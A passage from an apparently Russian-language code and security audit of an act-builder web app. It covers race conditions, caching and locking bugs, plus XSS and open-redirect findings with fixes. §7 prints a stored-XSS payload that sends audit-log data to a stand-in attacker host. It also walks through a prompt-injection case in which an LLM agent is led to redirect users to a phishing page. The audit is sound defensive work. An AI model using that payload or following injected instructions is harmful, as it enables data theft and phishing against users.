| TableManager / TableCellsOperations | `AppState.tables[id]`, `tableUISizes[id]` | `table.grid[r][c].*`, `tableUISizes[tableId]`, `selectedCells` | **НЕТ к соседним сущностям.** |
| TreeManager / TreeRenderer | `treeData`, `tables[id].is*RiskTable` (для drag-блокировки) | `node.tb` через `_onTbCheckboxChange` | `node.tb` пишется 3 путями (см. E-1) |
| state-tree.js (`AppState.*Node` API) | `treeData`, `tables` | `treeData.children`, cascade delete | by design |
| ItemsRenderer | `treeData`, `tables`, `textBlocks`, `violations` | `tables[id].grid[r][c]` через `_syncTables`, аналогично textBlocks/violations | by design (sync функции — централизованный DOM→state pull) |

### 3.5 Прочие подтверждённые находки в §3

#### [MEDIUM] M5 — Дублирование логики нумерации
**Подтверждено** (VER-3). Формат метки строится в 3 местах + есть формула «`customLabel || number || label`», встречающаяся **9 раз**. Любое изменение приоритетов фолбэков — рассинхрон.

**Fix:** вынести в `TreeUtils.getNodeDisplayName(nodeId)` (он уже есть на line 324) + `getNodeNumberPrefix(node)`.

#### [MEDIUM] M6 — TreeRenderer → ItemsRenderer cross-zone TB-sync
**Подтверждено** (VER-3).

`tree-renderer.js:586-598` напрямую вызывает private-методы:
- `ItemsRenderer._createTbSelector(node)`
- `ItemsRenderer._updateParentTbInItems(node)`

**Fix:** event-bus `EventBus.emit('node:tbChanged', {nodeId})` или DI callbacks.

#### [LOW] M7 — Dead-parameter в `_cleanupMetricsTablesAfterRiskTableDeleted(deletedNodeId)`
**Подтверждено** (VER-3) как **dead-parameter, не баг.**

Поведение корректное: функция работает «реконсилитивно» — пересчитывает по всему §5. Параметр оставлен «на будущее» или для логирования. Имя метода вводит в заблуждение.

**Fix:** убрать параметр, переименовать в `_reconcileMetricsTables()`.

#### [MEDIUM] M8 — Магические строки nodeTypes
**Подтверждено** (VER-3). **92 occurrences across 17 files** литералов `'table'/'textblock'/'violation'/'item'`. `AppConfig.nodeTypes` существует, но используется только в 5 файлах.

**Топ-5 файлов:** `state-content.js` (17), `state-tree.js` (9), `context-menu-tree.js` (13), `items-renderer.js` (5), `state-core.js` (6).

**Fix:** жёсткий рефакторинг `=== 'table'` → `=== AppConfig.nodeTypes.TABLE`.

#### [MEDIUM] M9 — `AppState.deleteNode` не проверяет `protected`/`deletable`
**Подтверждено** (VER-3). Защита от удаления секций 1-5 живёт **исключительно в UI** (`context-menu-tree.js:336-339`). Если код позовёт `AppState.deleteNode('5')` напрямую (миграция, dev-tools, undo) — узел удалится со всем содержимым.

**Fix (XS):** в `deleteNode` добавить `if (node.protected || node.deletable === false) { Notifications.error('Защищён'); return false; }`.

### 3.6 Новые находки в §3

#### [MEDIUM] E-1 — `node.tb` мутируется в 3 местах без координации
**Новая** (VER-3). Файлы: `tree-renderer.js:533-546`, `items-renderer.js:279-296`, `state-tree.js:147-149, 372-380, 826-836`. ChangeLog для TB не записывается.

**Fix:** `AppState.setNodeTb(nodeId, abbr, checked)` — единая точка + changelog.

#### [MEDIUM] E-2 — `TreeUtils.isPinnedTable` асимметричен
**Новая** (VER-3). Metrics-флаги на node (`isMetricsTable`, `isMainMetricsTable`), risk-флаги на table-объекте. Если backend пришлёт `node.isRegularRiskTable: true` без флага в `tables` — pinned-логика молча сломается.

**Fix:** унифицировать — все pinned-флаги на node (структурное свойство).

#### [MEDIUM] E-3 — Каскадная логика metrics↔risk размазана по 4 файлам
**Новая** (VER-3). 6 предикатов только в `context-menu-tree.js` + 5 функций в `state-content.js` + 5 в `state-tree.js` + дубль в `tree-drag-drop.js`. Инвариант «метрики на 5.X ⇔ риски в 5.X.Y+» поддерживается имплицитно.

**Fix (L):** ввести `MetricsRiskCoordinator` сервис с API `onRiskTableAdded/Removed/SubtreeMoved/validateAdd`.

#### [LOW] E-5, E-6 — Drag-drop race с async moveNode и async-апдейтами
**Новые** (VER-3). При await `DialogManager.show` внутри `_checkMetricsTableDeletion` пользователь может начать новый drag → cleanup() сотрёт состояние второго drag. Также: если во время drag пришёл auto-reload (api.js:415 пересоздал treeData), draggedElement становится sirota.

### 3.7 Drag-drop, валидация — без изменений

Содержание разделов 3.4 (drag-drop), 3.5 (validation) исходного документа — без переоценки, см. оригинал. Pinned tables, защита секций 1-5 — без изменений в логике.

---

## §4. UX-оболочка: header, preview, диалоги, hotkeys

### 4.1 Header — без изменений

Композиция: 8 партиалов (chat-popup, help, save-indicator, steps, preview-button, acts-menu, settings-menu, exit-button).

### 4.2 Hotkeys — полная карта (16 listener'ов)

**Подтверждено** (VER-4). Главное обновление по сравнению с as-is: **9 глобальных Escape-listener'ов** без stack-координации (L9 — листенеров не 5+, а 9).

| # | Файл | Combo | Условие | Конфликт |
|---|---|---|---|---|
| 1 | `app.js:149` | Ctrl+S/Cmd+S | всегда | H5 |
| 2-9 | settings/preview/acts/chat-popup/help/dialog-base/chat-modal/chat-renderer | Escape | по флагу `isOpen` | каскадно закрывают всё |
| 10-12 | portal-settings, violation-paste, tree-core | Escape | element-level | E |
| 13-15 | table-core/context-menu-links/textblock-links | Escape | element-level | E |
| 16 | items-title-editing | Enter/Escape | element-level | элементный |

**Bad-outcome:** Escape в комплексной ситуации (открытый helpModal + actsMenu сверху) каскадно закрывает оба — никто не использует `stopImmediatePropagation`.

**Fix (M):** единый `EscapeManager` со стеком, аналогично `DialogBase._activeDialogs`.

### 4.3 Подтверждённые находки в §4

#### [HIGH] H5-A — Ctrl+S во время редактирования ячейки сохраняет неактуальное состояние
**Подтверждено и уточнено** (VER-4).

```js
// app.js:149
document.addEventListener('keydown', async (e) => {
    if ((e.ctrlKey || e.metaKey) && e.code === AppConfig.hotkeys.save.key) {
        e.preventDefault();
        e.stopImmediatePropagation();
        await StorageManager.forceSaveAsync();  // ← берёт snapshot ДО commit редактируемой ячейки
        const generateBtn = document.getElementById('generateBtn');
        if (generateBtn) generateBtn.click();
    }
});
```

**Bad-outcome:** пользователь редактирует ячейку, AppState ещё не обновлён (live в textarea), нажимает Ctrl+S → сохраняется предыдущая версия + click generate → экспорт без последних правок.

**Fix (M):** перед `forceSaveAsync` — `document.activeElement?.blur()` или явный `commitPendingEdits()` в AppState.

#### [HIGH] H6-A — Preview rebuild на каждый input в нарушении/списке
**Подтверждено жёстко** (VER-4).

```js
// items-title-editing.js:288-291
input.addEventListener('input', () => {
    violation[fieldName].items[index] = input.value;
    PreviewManager.update();  // ← на КАЖДЫЙ символ
});
```

`PreviewManager.update` оборачивает `_performUpdate` в RAF, но **не дедуплицирует** — 60 input-событий = 60 rebuild'ов всего дерева preview (200-2000 createElement каждый).

**Fix (S):**
```js
static _updateScheduled = false;
static update(options = {}) {
    if (this._updateScheduled) return;
    this._updateScheduled = true;
    requestAnimationFrame(() => {
        this._updateScheduled = false;
        this._performUpdate(...);
    });
}
```

#### [HIGH] M12-A — `app:state-changed` listener мёртв
**Новая** (VER-4 + NEW-2).

```js
// preview-menu.js:345-349
document.addEventListener('app:state-changed', () => {
    if (window.previewMenuManager?.isOpen) {
        window.previewMenuManager.forceUpdate();
    }
});
```

`grep -rn "dispatchEvent.*state-changed"` → **0 совпадений**.

**Bad-outcome:** side-panel preview-menu НЕ обновляется автоматически. Юзер открыл panel → правит ячейки → panel «заморожена», нужно её закрыть и снова открыть.

**Fix (S):** либо эмитить событие, либо хук в `PreviewManager.update`: `if (window.previewMenuManager?.isOpen) window.previewMenuManager.updateContent()`.

#### [HIGH] H7-A — Магический `setTimeout(50)` перед `restoreTableSizes`
**Подтверждено** (VER-4).

```js
// context-menu-cells.js:783-803
restoreTableSizes(allTableSizes) {
    if (AppState.currentStep === 2) {
        ItemsRenderer.renderAll();
        setTimeout(() => {
            document.querySelectorAll('.table-section').forEach(...);
        }, 50);
    }
}
```

**Bad-outcome:** на медленных машинах renderAll может не успеть за 50 мс → `querySelectorAll` вернёт пустоту → размеры не применятся.

**Fix (S):** двойной `requestAnimationFrame` гарантирует rendered DOM.

#### [HIGH] M11-A — read-only `disabled` затирается _updateSaveIndicator
**Подтверждено** (VER-4). См. §2 (та же находка).

#### [HIGH] M10-A — HelpManager vs DialogManager — параллельные иерархии
**Подтверждено** (VER-4). HelpManager наследует DialogBase, но переопределяет `_setupModalEscapeHandler` и не регистрируется в `_activeDialogs`. При двух открытых диалогах Escape закрывает оба.

**Fix (M):** мигрировать HelpManager на `_setupEscapeHandler` из DialogBase + регистрировать в `_activeDialogs`.

#### [HIGH] L7-A — `verifyInvoice` — заглушка
**Подтверждено** (VER-4). `api.js:741-758` шлёт реальный POST `/api/v1/acts/invoice/verify`, но в `dialog-invoice.js:1147-1155` результат — только `console.log`/`console.warn`.

**Bad-outcome:** верификация может вернуть warnings (метрики не найдены) — пользователь видит «успешно прикреплено», проблема выяснится при генерации.

**Fix (M):** определить контракт `verifyResult`, отрендерить warnings inline.

#### [HIGH] L8-A — Silent fail в _loadMetricDict/_loadProcessDict/_loadSubsidiaryDict
**Подтверждено** (VER-4). При ошибке кеш ставится `[]` навсегда для текущей сессии. Пользователь не находит ни одной метрики/процесса.

**Fix (S):** не кешировать `[]` (оставить `null` для retry); `Notifications.error("Не удалось загрузить справочник метрик. Попробуйте позже.")`.

### 4.4 Новые находки в §4

#### [HIGH] N1 (UX) — forceSave не блокирует двойной POST
**Новая** (VER-4).

```js
// app.js:127
newBtn.addEventListener('click', (e) => {
    if (!newBtn.disabled) {
        StorageManager.forceSave();  // ← не await, кнопка НЕ дизейблится
    }
});
```

`_updateSaveIndicator()` дизейблит её только при `_isSyncedWithDB === true` — после завершения save.

**Bad-outcome:** двойной клик «Сохранить» = два параллельных POST `/api/v1/acts/{id}/content`.

**Fix (S):**
```js
static _saveInFlight = false;
static async forceSave() {
    if (this._saveInFlight) return;
    this._saveInFlight = true;
    try { /* ... */ } finally { this._saveInFlight = false; }
}
```

#### [HIGH] N8 (UX) — Notifications без лимита, при шторме DOM лагает
**Новая** (VER-4). При 50 ошибках валидации одновременно — 50 элементов в DOM, всё живёт 8с auto-hide.

**Fix (S):** `MAX_NOTIFICATIONS=15`, скрывать oldest.

#### [MEDIUM] N2 (UX) — ActsMenuManager — кеш 1 мин показывает удалённый акт
**Новая** (VER-4). Cache не слушает события из других вкладок. Click → 404.

**Fix (M):** `storage`-event для cross-tab sync или ETag/304.

#### [MEDIUM] N6 (UX) — header-exit не учитывает фоновую save-операцию
**Новая** (VER-4). Если в момент клика «Выход» идёт периодическое автосохранение, `hasUnsavedChanges()` возвращает false, но POST ещё в полёте. `_performExit` → unlock → redirect без await.

**Fix (S):** `await StorageManager._pendingSavePromise` если есть.

#### [MEDIUM] N7 (UX) — InvoiceDialog leak Promise при закрытии во время AJAX
**Новая** (VER-4). `this._currentNode.invoice = {...}` после await на закрытом диалоге → TypeError. + ложное «Фактура успешно прикреплена».

**Fix (M):** `AbortController` на fetch + `if (!this._currentOverlay) return;` в then.

### 4.5 DialogInvoice — отдельный анализ

**1211 строк, 6 кешей без TTL, 6 silent-fail catch.**

| Кеш | Инвалидируется |
|---|---|
| `_invoiceConfig` | НИКОГДА (live-of-process) |
| `_cachedTables` | при switch dbType (внутри одного — нет) |
| `_cachedMetricDict` | НИКОГДА |
| `_cachedProcessDict` | НИКОГДА |
| `_cachedSubsidiaryDict` | НИКОГДА |

**Bad-outcome:** ETL-команда добавляет новые метрики/процессы → пользователь не видит. Нужен F5.

**Fix (M):** TTL 5-15 мин + кнопка «Обновить справочники» в диалоге.

### 4.6 Опровергнутого нет

Все 9 флагов исходного аудита подтверждены.

---

## §5. Менеджер актов

### 5.1 Структура

CRUD-интерфейс с учётом блокировок, аудит-логирования и версионирования. Карточки в `#actsListContainer`, диалоги Create/Edit/AuditLog/VersionPreview, поиск участников с debounce, diff между версиями.

### 5.2 JS-инвентарь — без изменений

7 файлов, 4023 строки. См. оригинал §5.2 (acts-manager-page 731, dialog-create-act 1413, dialog-audit-log 672, team-member-search 282, version-preview 338, diff-engine 300, diff-renderer 287).

### 5.3 Подтверждённые находки в §5

#### [CRITICAL] N1 (Acts Manager) — Двойной PATCH при сохранении метаданных
**Новая** (VER-5).

**Файлы:** `acts-manager-page.js:496-535` (перехват), `dialog-create-act.js:1000-1032,1254-1269` (handler).

Перехват `_closeDialog` для autosave:
```js
CreateActDialog._closeDialog = async function safeClose() {
    if (!dialogClass._isSaving && lockAcquired) {  // ← _isSaving=undefined в этом flow!
        dialogClass._isSaving = true;
        const form = dialogClass._currentDialog?.querySelector('#actForm');
        if (form) {
            await dialogClass._handleFormSubmit(form, true, actId, username, form);  // ← PATCH №2
        }
    }
};
```

Flow:
1. `form.onsubmit` → `_handleFormSubmit` → PATCH №1 успешен → `_handleSubmitSuccess` (стр 1026).
2. `_handleSubmitSuccess` вызывает `this._closeDialog()` (стр 1255).
3. `_closeDialog` ПЕРЕХВАЧЕН: `_isSaving === undefined → !undefined === true` → войдёт в save-блок → **второй `_handleFormSubmit` = PATCH №2**.

**Bad-outcome:** воспроизводимо при каждом «Сохранить изменения» через ✏️ на acts-manager. Audit-log получает 2 события «обновление метаданных», увеличивается нагрузка на БД. Дополнительный риск: во втором вызове передан `form` как пятый аргумент `dialog` — silent breakage при изменении DOM.

**Effort:** 1 строка. Выставить `_isSaving = true` в начале `_handleFormSubmit` или в `_handleSubmitSuccess` до `_closeDialog()`.

#### [CRITICAL] N2 (Acts Manager) — Двойной AppConfig.api.getUrl в _createWithNewPart
**Новая** (VER-5, подтверждено NEW-5).

**Файлы:** `dialog-create-act.js:1310 + 1378`.

```js
// stage 1 — уже обёрнуто
await this._createWithNewPart(AppConfig.api.getUrl('/api/v1/acts/create'), body, currentUser);

// stage 2 — снова оборачивает
const resp = await fetch(AppConfig.api.getUrl(`${endpoint}?force_new_part=true`), {...});
```

Результат под JupyterHub-proxy:
```
https://hub/user/USER/proxy/8000/https://hub/user/USER/proxy/8000/api/v1/acts/create?force_new_part=true
```
→ **404 всегда**. Также в dev: `http://localhost:8000/http://localhost:8000/api/v1/acts/create?force_new_part=true`.

**Bad-outcome:** создание новой части при коллизии КМ **полностью сломано в любом окружении**.

**Effort:** 1 строка. `await fetch(`${endpoint}?force_new_part=true`, {...});`.

#### [CRITICAL] N5 (Acts Manager) — VersionPreviewOverlay ломает lock AuditLogDialog
**Новая** (VER-5).

**Файлы:** `version-preview.js:288-323`, фон `dialog-audit-log.js:36-46`.

```js
// version-preview.js:288-323
await APIClient.lockAct(this._actId);
try {
    const result = await APIClient.restoreVersion(this._actId, versionId);
} finally {
    await APIClient.unlockAct(this._actId).catch(() => {});  // ← СНИМАЕТ lock, который держит AuditLogDialog
}
```

`atomic_lock_act` идемпотентен для того же юзера → повторный lock пройдёт. Но `unlockAct` в finally снимает блокировку **глобально для акта** — а `LockManager` в AuditLogDialog продолжает heartbeat и при следующем `extend_lock` получит «Вы не владеете блокировкой».

**Bad-outcome:** Куратор → AuditLogDialog (lock взят) → preview версии → restore → unlock снял lock → через 1-2 мин LockManager пытается extend → 4xx → юзер видит фейковое «Сессия завершена», хотя сам активен.

**Сравнение:** `AuditLogDialog._restoreVersion` (стр 360-391) НЕ берёт повторный lock, использует уже взятый — корректно.

**Effort:** удалить 4 строки. Убрать lock/unlock-обёртку в `VersionPreviewOverlay._restore` — он всегда открывается из AuditLogDialog.

#### [HIGH] H10 — `window.env?.JUPYTERHUB_USER` vs `AuthManager.getCurrentUser()`
**Подтверждено** (VER-5). 2 места в `dialog-create-act.js:61, 157` используют `window.env`, остальные 5 в `acts-manager-page.js` + `shared/api.js` — `AuthManager`. Разные источники в обычном vs перехваченном flow.

**Effort:** стандартизировать на `AuthManager.getCurrentUser()`.

#### [HIGH] N3 (Acts Manager) — Нет cross-tab/cross-window инвалидации списка
**Новая** (VER-5).

**Файлы:** весь `acts-manager-page.js` + `dialog-create-act.js:1329`.

`_invalidateCache` чистит ТОЛЬКО `ActsMenuManager._clearCache()` внутри create/edit flow. После **deleteAct/duplicateAct** (стр 551-660) — НЕТ вызова `_clearCache`. Если юзер дублирует акт на acts-manager и переходит в конструктор — меню в шапке покажет старый список (TTL 60с).

**Bad-outcome:** open удалённого акта → 404. Stale state до 60 сек.

**Fix:** BroadcastChannel('acts-list') + `_clearCache()` после delete/duplicate.

#### [MEDIUM] M13, M14, M15, M16 — все подтверждены
- M13 — ручная фильтрация audit-log без FilterEngine (которого нет в проекте).
- M14 — неявная зависимость `window.currentActId` в `_refreshAfterEdit`.
- M15 — silent fail автозаполнения Руководителя.
- M16 — нет debounce на фильтрах audit-log (5 keystroke → 5×40k ops).

### 5.4 Опровергнутые

- **L10** (DiffEngine/DiffRenderer window-экспорт) — **не баг, корректный singleton-паттерн** (CLAUDE.md).
- **L11** (нет валидации структуры при restore) — **не нужен валидатор**, backend pydantic делает это. Зато найден реальный backend-баг (N6).

### 5.5 Новые backend-зависимости

- **N6** [MEDIUM]: `restore_version` (`audit_log_service.py:20-66`) не сохраняет current-snapshot перед перезаписью → lost write для активного редактора.
- **N7** [MEDIUM]: `/api/v1/acts/users/search` (`api/users.py:14-22`) без `Depends(get_username)` → массовая выгрузка справочника.
- **deleteAct hard-delete** [LOW]: `DELETE FROM acts WHERE id=$1` без soft-delete. Открытый редактор получит 404 при следующем save.

### 5.6 Прочее

- **G.4** [MEDIUM]: silent fail AuditLogDialog.show при locked акте — ничего не открылось, ничего не сказано.
- **C.6** [LOW]: DiffEngine sync на крупных tree_data (1000+ нод × 100 таблиц × 50 текстблоков) — 500-1000 мс block UI. Worker на будущее.

---

## §6. Shared-модули

### 6.1 Карта модулей — без изменений

См. оригинал §6.1.

### 6.2 AppConfig — load-bearing для JupyterHub-proxy

`getBaseUrl()` кэширует `${origin}${proxyMatch[1]}`. `getUrl(endpoint)` склеивает. **Подтверждено корректным.**

### 6.3 Подтверждённые находки в §6

См. §1 (H2, H12, M1, L1, L2, L12, L13).

#### [MEDIUM] M17/M18 — Утечки подписок ChatEventBus
**Подтверждено частично** (VER-1). `chat-messages.js` имеет симметричные init/destroy, ОК. Но `chat-context.js:34`:

```js
ChatEventBus.on('chat:clear', () => {       // ← анонимный listener
    this._currentConversationId = null;
    this._pendingEnsure = null;
});
```

Отписать нельзя. В текущей MPA-архитектуре безвреден (страница перезагружается), при SPA/тестах — утечка.

**Fix (S):** именованный handler + `destroy()` метод в ChatContext.

#### [MEDIUM] M19 — `_activeResumePromises` без cleanup
**Подтверждено** (VER-1). Объект промисов накапливается по `conversationId`. На 50-100 чатах <1MB, на 1000+ — заметная утечка.

**Fix (S):** `finally { delete this._activeResumePromises[id] }`.

#### [MEDIUM] M20 — NotificationManager.messageCache leak при duration=0
**Подтверждено** (VER-1). При `duration=0` (постоянные уведомления) запись в `messageCache` живёт навсегда.

**Fix (S):** очищать запись при `hide()` через `_clearCache(id)`.

### 6.4 Опровергнутое в §6

- **H11** — **опровергнуто** (VER-1). `chat-context.js:100-104` fallback на `endpoint` срабатывает только если AppConfig undefined (unit-тесты/standalone). В реале AppConfig всегда определён.

### 6.5 Window-exports inventory

См. VER-1 §«Дополнительный inventory» — 22 window-export'а в shared/. Только один настоящий instance-singleton (`Notifications = new NotificationManager()`). Остальные — utility-objects/classes со статическими методами.

### 6.6 Новые находки

- **N4** [LOW] — `ChatContext.deleteConversation` отсутствует, всё через `ChatHistory.deleteConversation`. Размытие слоёв «панель UI» / «контекст». Документально зафиксировать или вынести.

---

# Часть II. Сквозные аспекты

## §7. Security (новая глава)

### 7.1 Сводка

- **CRITICAL: 2** stored XSS
- **HIGH: 3** (XSS в diff, отсутствие security headers, XSS в preview-textblock)
- **MEDIUM: 4** (escape, open-redirect, LS exposure)
- **LOW: 3** (auth-header dead, console.log username, DOMPurify fallback)
- **INFO: 2**

### 7.2 [CRITICAL] C-XSS-1 — Stored XSS через textBlock.content

**Файл:** `static/js/constructor/textblock/textblock-editor.js:27`

```js
createEditor(textBlock) {
    const editor = document.createElement('div');
    editor.className = 'textblock-editor';
    editor.dataset.textBlockId = textBlock.id;
    editor.dataset.placeholder = 'Введите текст...';
    editor.innerHTML = textBlock.content || '';   // ← НЕТ санитизации
    ...
}
```

**Data-flow:**
1. `textBlock.content` приходит из `GET /api/v1/acts/{act_id}/content` → `ActContentService.get_content` (`app/domains/acts/api/content.py:24-37`).
2. На бэке `TextBlockSchema.content: str` без HTML-санитизации (`app/domains/acts/schemas/act_content.py:180`).
3. Сохраняется через `PUT /api/v1/acts/{act_id}/content` — никакой HTML-фильтрации в `ActContentService.save_content` (`grep sanitize|bleach|html.escape` по `app/domains/acts/` — **0 совпадений**).

**Attack scenario:**
1. Аудитор-инсайдер с доступом «Цифровой акт» (дефолтная роль) открывает любой акт.
2. Через DevTools (или прямой POST в API) сохраняет в textblock контент:
   ```html
   <img src=x onerror="
       fetch('/api/v1/admin/audit-log').then(r=>r.json()).then(d=>
         fetch('//attacker.controlled/leak?data=' + btoa(JSON.stringify(d)))
       )
   ">
   ```
3. PUT уходит без валидации, БД хранит payload.
4. Любой коллега / админ откроет акт → `editor.innerHTML = payload` → `<img onerror>` срабатывает в контексте сессии жертвы.
5. Внутри JupyterHub-домена атакующий получает доступ ко всем cookie/storage origin'а, может дёрнуть admin-API от имени жертвы, украсть Kerberos-зависимые ресурсы.

**Почему contentEditable=true не защищает:** `<script>` не исполнится при `innerHTML` в contentEditable-контейнере, но `onerror`/`onclick`/`<iframe srcdoc>` срабатывают.

**Effort:** M / 4-8ч.

**Fix direction:**
- **Краткосрочно (фронт):** `editor.innerHTML = DOMPurify.sanitize(textBlock.content || '', { USE_PROFILES: { html: true } })`. Также в `preview-textblock-renderer.js:41`, `diff-renderer.js:198/200/209/211`, `dialog-help.js:169`.
- **Долгосрочно (бэк):** `bleach.clean` в `ActContentService.save_content`, whitelist тэгов `[p, br, b, strong, i, em, u, span, a, ul, ol, li, h1-h6]` + атрибутов `[href, class, style*]` (без `on*`, `srcdoc`, `formaction`, `src` для не-img).
- **Defense in depth:** CSP `default-src 'self'; script-src 'self' 'unsafe-inline'` (см. H-HEADERS).

**Cross-links:** C-XSS-2, H-XSS-1, H-XSS-3 — тот же класс баги по разным sink'ам.

### 7.3 [CRITICAL] C-XSS-2 — Stored XSS в preview через violation-fields

**Файл:** `static/js/constructor/preview/preview-violation-renderer.js:177-185`

```js
static _addLine(container, label, text, maxLength = null) {
    const trimLength = maxLength ?? AppConfig.preview.defaultTrimLength;
    const line = document.createElement('div');
    line.className = 'preview-violation-line';
    line.innerHTML = `${label}: ${this._trim(text, trimLength)}`;   // ← НЕТ escape
    container.appendChild(line);
}
```

`_trim` возвращает `text.slice(...)` без экранирования. Вызывающие места используют `violation.violated`, `violation.established`, `violation[fieldName].content` для опциональных полей.

**Особенность против C-XSS-1:** редактирование идёт через `<textarea>` (XSS-safe), но **preview-режим** ставит то же содержимое через `innerHTML`. Если юзер запишет `<img src=x onerror=...>` в textarea — сохранится буквально, в preview исполнится.

**Особо плохо:** preview-панель открыта **по умолчанию** и обновляется debounced при каждом редактировании. Атакующему не нужно ждать ручной активации — достаточно чтобы жертва открыла акт. **Срабатывает раньше C-XSS-1.**

**Effort:** S / 1-2ч.

**Fix:**
```js
line.appendChild(document.createTextNode(`${label}: ${this._trim(text, trimLength)}`));
```

### 7.4 [HIGH] H-XSS-1 — Stored XSS в diff-режиме версий

**Файл:** `static/js/portal/acts-manager/diff-renderer.js:193-215`

```js
if (tbDiff.status === 'added') {
    div.innerHTML = tbDiff.newContent || '';        // ← NEW: NO sanitization
} else if (tbDiff.status === 'removed') {
    div.innerHTML = tbDiff.oldContent || '';        // ← OLD: NO sanitization
} else if (tbDiff.status === 'modified' && tbDiff.wordDiff) {
    // ... здесь _escapeHtml есть
} else {
    div.innerHTML = tbDiff.content || tbDiff.newContent || '';   // ← fallback: NO escape
}
```

Только `modified` ветка использует `_escapeHtml` (line 205). `added`/`removed`/`fallback` ветки — нет.

**Effort:** S / 1-2ч. Обернуть все `div.innerHTML = ...Content` через DOMPurify. После фикса C-XSS-1 (серверная санитизация) diff станет безопасен автоматически.

### 7.5 [HIGH] H-XSS-3 — Preview-textblock

**Файл:** `static/js/constructor/preview/preview-textblock-renderer.js:36-44`

Тот же data-flow что C-XSS-1, другой sink. Срабатывает в preview-панели по умолчанию.

**Fix:** S, идентично C-XSS-1 — DOMPurify-обёртка.

### 7.6 [HIGH] H-HEADERS — Нет CSP / X-Frame-Options / HSTS / nosniff

**Файлы:** `app/main.py`, `app/core/middleware.py`

В middleware-цепочке есть `HTTPSRedirectMiddleware`, `RequestSizeLimitMiddleware`, `RateLimitMiddleware`, `RequestIdMiddleware` — **никаких security-headers middleware**.

На HTML/JSON-ответах:
- **Нет CSP** → любой XSS (C-XSS-1/2, H-XSS-1/3) усиливается до full script-exec.
- **Нет X-Frame-Options** → click-jacking возможен (за JupyterHub-proxy смягчено).
- **Нет HSTS** → возможен HTTP-downgrade.
- **Нет X-Content-Type-Options** на HTML/JSON → MIME-sniffing атаки.
- **Нет Referrer-Policy** → утечка URL'ов в Referer.

**Effort:** S / 2-4ч. Новый `SecurityHeadersMiddleware`:
```python
class SecurityHeadersMiddleware:
    async def __call__(self, scope, receive, send):
        if scope["type"] != "http":
            await self.app(scope, receive, send); return
        async def send_wrapper(msg):
            if msg["type"] == "http.response.start":
                headers = list(msg.get("headers", []))
                headers.extend([
                    (b"x-content-type-options", b"nosniff"),
                    (b"x-frame-options", b"SAMEORIGIN"),
                    (b"referrer-policy", b"same-origin"),
                    (b"content-security-policy",
                     b"default-src 'self'; script-src 'self' 'unsafe-inline'; "
                     b"style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; "
                     b"connect-src 'self'; frame-ancestors 'self'; base-uri 'self';"),
                ])
                msg["headers"] = headers
            await send(msg)
        await self.app(scope, receive, send_wrapper)
```

### 7.7 Прочие security-находки

| ID | Severity | Заголовок | Файл | Effort |
|---|---|---|---|---|
| M-ESC-1 | MEDIUM | username без escape в audit-log | `dialog-audit-log.js:415,503` | XS |
| M-ESC-2 | MEDIUM | unquoted data-attribute в admin-add-user | `admin-add-user-dialog.js:119` | XS |
| M-OPEN-REDIR | MEDIUM | open-redirect через `open_url` whitelist `https://*` | `chat-client-actions.js:142-158`, `app/core/chat/blocks.py:32-34` | S |
| M-LS-EXPOSE | MEDIUM | acts state в localStorage содержит полное содержимое акта | `storage-manager.js`, `acts-menu.js:75` | M |
| L-AUTH-HDR | LOW | `X-JupyterHub-User` header dead/misleading (бэк не использует) | `auth.js:262-267` | S |
| L-HDR-FB | LOW | `portal.py` landing принимает header вместо ENV | `app/routes/portal.py:39-43` | XS |
| L-LS-USER | LOW | LS `auth_username` доступен XSS-вектору | `auth.js:13` | M |
| I-CONSOLE | INFO | console.log username | `auth.js:164,197` | XS |
| I-DOM-FB | INFO | DOMPurify-fallback пишет non-sanitized если vendor отсутствует | `chat-renderer.js:33-41` | — |

### 7.8 M-OPEN-REDIR детали

**Файл:** `static/js/shared/chat/chat-client-actions.js:124-128, 153-159`

```js
const ALLOWED_OPEN_URL_SCHEMES = ['http://', 'https://', 'mailto:', '/'];
function isAllowedUrl(url) {
    return ALLOWED_OPEN_URL_SCHEMES.some(s => url.startsWith(s));
}
ClientActionsRegistry.register('open_url', ({ url }) => {
    if (!isAllowedUrl(url)) { console.warn(`open_url: запрещённая схема URL`); return; }
    window.location.href = resolveProxyUrl(url);   // ← любой https://evil.com проходит
});
```

`http://`/`https://` пускают любой external URL.

**Attack via prompt-injection:**
1. LLM-агент запрашивает информацию из третьесторонней knowledge-base с инъекцией.
2. LLM возвращает:
   ```json
   {"type": "client_action", "action": "open_url", "params": {"url": "https://phishing-clone.evil/login"}}
   ```
3. Юзер видит «открывается ссылка...» или мгновенный redirect.

**Effort:** S / 1-2ч. Allowlist доменов:
```js
const ALLOWED_EXTERNAL_HOSTS = new Set(['confluence.sbrf.ru', ...]);
function isAllowedUrl(url) {
    if (url.startsWith('/') || url.startsWith('mailto:')) return true;
    try {
        const u = new URL(url);
        if (u.protocol !== 'https:' && u.protocol !== 'http:') return false;
        return ALLOWED_EXTERNAL_HOSTS.has(u.host);
    } catch { return false; }
}
```
И симметрично на бэке (`app/core/chat/blocks.py`).

### 7.9 ChatRenderer корректно санитизирован

`static/js/shared/chat/chat-renderer.js:25-42::_safeSetHtml` оборачивает все markdown-output'ы через `DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })`. Все вызовы из `_renderText`, `_renderReasoning`, стриминг-блоков идут через `_safeSetHtml`. **Безопасно.**

### 7.10 Paste-handler анализ

- `textblock-editor.js:136-148` — `e.preventDefault()` + `getData('text/plain')` + `execCommand('insertText', ...)`. **Безопасно.**
- `violation-paste.js:27-146` — только `text/plain` или `image` через FileReader. HTML из буфера не используется. **Безопасно.**
- `items-title-editing.js` — paste не перехватывается, но contentEditable снимается через blur и значение читается через `textContent`. **Безопасно.**

XSS не через paste, а через данные, уже сохранённые в БД (см. C-XSS-1).

### 7.11 CSRF — особенность auth-модели

CSRF-токены не требуются: auth полностью stateless, username из ENV `JUPYTERHUB_USER` (которое cross-origin запросы не несут). Cookies не используются (`document.cookie` — 0 совпадений). Однако в JupyterHub-деплое два разных приложения юзера на одном origin → если есть второе приложение с XSS — оно может дёрнуть Act Constructor API на тот же ENV-username. Это **privilege-escalation через scope sharing**, митигируется на уровне JupyterHub.

### 7.12 Контрольные регрессионные тесты

```python
# tests/security/test_xss_act_content.py
# POST payload с <script>, <img onerror>, <svg onload>, <iframe srcdoc>,
# проверка что сохранённый content не содержит on*-атрибуты и опасные теги.

# tests/security/test_security_headers.py
# GET /, /constructor?act_id=1, /api/v1/auth/me —
# проверка наличия CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy.

# tests/security/test_open_url_whitelist.py
# ClientActionBlock с https://evil.com отклоняется на бэке.
```

---

## §8. Performance (новая глава)

